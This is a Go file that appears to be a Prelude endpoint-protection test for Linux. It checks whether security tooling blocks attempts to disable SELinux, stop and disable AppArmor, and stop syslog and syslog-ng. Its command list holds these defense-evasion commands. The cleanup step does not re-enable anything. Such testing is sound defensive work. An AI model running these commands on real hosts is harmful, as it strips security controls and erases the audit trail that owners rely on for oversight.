//go:build linux
// +build linux

/*
ID: b63df89d-ac6f-44d7-80fa-ddf038295e42
NAME: Attempt to Disable Linux Security and Logging Controls
CREATED: 2024-06-29
scenario: disable SELinux + security/logging on linux
*/
package main

import (
	"os/exec"
	"time"

	Endpoint "github.com/preludeorg/test/endpoint"
)

var commands = [][]string{
	{"setenforce", "0"},
	{"systemctl", "disable", "apparmor"},
	{"systemctl", "stop", "apparmor"},
	{"systemctl", "disable", "syslog"},
	{"systemctl", "stop", "syslog"},
	{"systemctl", "disable", "syslog-ng"},
	{"systemctl", "stop", "syslog-ng"},
}

func main() {
	Endpoint.Start(test, cleanup)
}

/*
iterate over list of commands used to disable SELinux
*/
func test() {
	Endpoint.Say("starting test...")

	for _, cmd := range commands {
		_, err := exec.Command(cmd[0], cmd[1:]...).CombinedOutput()
		if err != nil {
			Endpoint.Say("command failed: " + cmd[0] + " " + cmd[1])
			Endpoint.Stop(126) // protected
		}
		time.Sleep(1*time.Second)
	}
	Endpoint.Say("commands executed")
	Endpoint.Stop(101) // unprotected
}

func cleanup() {
	Endpoint.Say("cleaning up")
}
